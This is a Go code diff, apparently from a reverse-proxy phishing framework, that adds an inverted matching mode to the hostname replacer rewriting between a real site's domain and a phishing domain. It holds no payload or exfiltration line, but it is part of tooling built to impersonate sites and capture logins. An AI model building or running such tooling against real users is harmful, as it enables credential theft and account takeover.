@@ -186,7 +186,7 @@ type ConfigPhishlet struct {
 
 type Replacer struct {
 	Size    int
-	Matches func(source string) bool
+	Matches func(source string, invert bool) bool
 	Apply   func(source string) string
 }
 
@@ -852,7 +852,10 @@ func (ph ProxyHost) BuildReplacer(unapply bool, phishDomain string) Replacer {
 
 			return Replacer{
 				Size: len(target),
-				Matches: func(source string) bool {
+				Matches: func(source string, invert bool) bool {
+					if invert {
+						return strings.Contains(source, replacement)
+					}
 					return strings.Contains(source, target)
 				},
 				Apply: func(source string) string {
@@ -862,6 +865,7 @@ func (ph ProxyHost) BuildReplacer(unapply bool, phishDomain string) Replacer {
 		}
 
 		expr := regexp.MustCompile(strings.ReplaceAll(ph.phish_subdomain, "*", "([^-._/]*)") + regexp.QuoteMeta("."+phishDomain))
+		invExpr := regexp.MustCompile(strings.ReplaceAll(ph.orig_subdomain, "*", "([^-._/]*)") + regexp.QuoteMeta("."+ph.domain))
 		target := combineHost(ph.phish_subdomain, phishDomain)
 		replacement := combineHost(ph.orig_subdomain, ph.domain)
 		sizeHint := ph.size_hint
@@ -871,7 +875,10 @@ func (ph ProxyHost) BuildReplacer(unapply bool, phishDomain string) Replacer {
 
 		return Replacer{
 			Size: sizeHint,
-			Matches: func(source string) bool {
+			Matches: func(source string, invert bool) bool {
+				if invert {
+					return invExpr.MatchString(source)
+				}
 				return expr.MatchString(source)
 			},
 			Apply: func(source string) string {
@@ -896,7 +903,10 @@ func (ph ProxyHost) BuildReplacer(unapply bool, phishDomain string) Replacer {
 
 		return Replacer{
 			Size: len(target),
-			Matches: func(source string) bool {
+			Matches: func(source string, invert bool) bool {
+				if invert {
+					return strings.Contains(source, replacement)
+				}
 				return strings.Contains(source, target)
 			},
 			Apply: func(source string) string {
@@ -906,6 +916,7 @@ func (ph ProxyHost) BuildReplacer(unapply bool, phishDomain string) Replacer {
 	}
 
 	expr := regexp.MustCompile(strings.ReplaceAll(ph.orig_subdomain, "*", "([^-._/]*)") + regexp.QuoteMeta("."+ph.domain))
+	invExpr := regexp.MustCompile(strings.ReplaceAll(ph.phish_subdomain, "*", "([^-._/]*)") + regexp.QuoteMeta("."+phishDomain))
 	target := combineHost(ph.orig_subdomain, ph.domain)
 	replacement := combineHost(ph.phish_subdomain, phishDomain)
 	sizeHint := ph.size_hint
@@ -915,7 +926,10 @@ func (ph ProxyHost) BuildReplacer(unapply bool, phishDomain string) Replacer {
 
 	return Replacer{
 		Size: sizeHint,
-		Matches: func(source string) bool {
+		Matches: func(source string, invert bool) bool {
+			if invert {
+				return invExpr.MatchString(source)
+			}
 			return expr.MatchString(source)
 		},
 		Apply: func(source string) string {
